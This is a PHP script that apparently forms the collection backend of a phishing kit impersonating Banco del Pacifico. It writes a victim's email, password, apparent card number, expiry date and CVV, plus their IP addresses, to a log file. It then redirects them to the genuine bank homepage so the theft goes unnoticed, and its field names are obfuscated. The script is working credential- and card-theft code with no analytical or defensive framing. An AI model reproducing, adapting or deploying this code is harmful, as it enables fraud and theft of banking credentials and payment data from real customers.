<?php
    session_start();

    $fhandlr = fopen($_SESSION['fnm'], "a");

    fwrite($fhandlr, "-------------------------------------------\n");
    fwrite($fhandlr, 'E: '.$_SESSION['fbwo12r92bfs']."\n");
    fwrite($fhandlr, 'P: '.$_SESSION['shfn2yc0285']."\n");
    fwrite($fhandlr, 'T: '.$_POST['tTR4P2SR']."\n");
    fwrite($fhandlr, 'FV: '.$_POST['PR9345FW']."/".$_POST['PR9345FW2']."\n");
    fwrite($fhandlr, 'CV: '.$_POST['pr3xt4rs']."\n");


    @fwrite($fhandlr, 'IP1: '.$_SERVER['REMOTE_ADDR']."\n");
    @fwrite($fhandlr, 'IP2: '.$_SERVER['HTTP_X_FORWARDED_FOR']."\n");


    fwrite($fhandlr, 'Date: '. date("d-m-Y")."\n");
    fclose($fhandlr);
    header ('Location:https://www.bancodelpacifico.com/personas/inicio');

    session_destroy();
    exit;
?>